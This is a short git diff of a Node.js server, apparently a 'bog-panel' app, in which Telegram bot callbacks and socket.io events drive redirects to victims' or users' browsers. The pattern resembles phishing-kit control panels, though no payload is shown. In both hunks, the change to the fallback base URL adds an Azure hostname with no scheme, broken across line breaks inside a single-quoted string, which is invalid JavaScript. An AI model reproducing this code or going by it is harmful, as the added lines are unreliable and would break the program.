@@ -182,7 +182,9 @@ io.on('connection', (socket) => {
             console.log(`Procesando acción ${action} para mensaje ${messageId}`);
 
             const isVercel = process.env.VERCEL === '1';
-            const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : 'http://localhost:3000';
+            const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '
+bog-panel-a7g7fqcgftfscrcv.centralus-01.azurewebsites.net
+';
             const { message, url } = handleRedirect(action, baseUrl);
 
             socket.emit('telegram_action', {
@@ -246,7 +248,9 @@ bot.on('callback_query', async (callbackQuery) => {
         
         // Configurar URL base según el entorno
         const isVercel = process.env.VERCEL === '1';
-        const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : 'http://localhost:3000';
+        const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : '
+bog-panel-a7g7fqcgftfscrcv.centralus-01.azurewebsites.net
+';
 
         // Responder al callback query
         await bot.answerCallbackQuery(callbackQuery.id, {
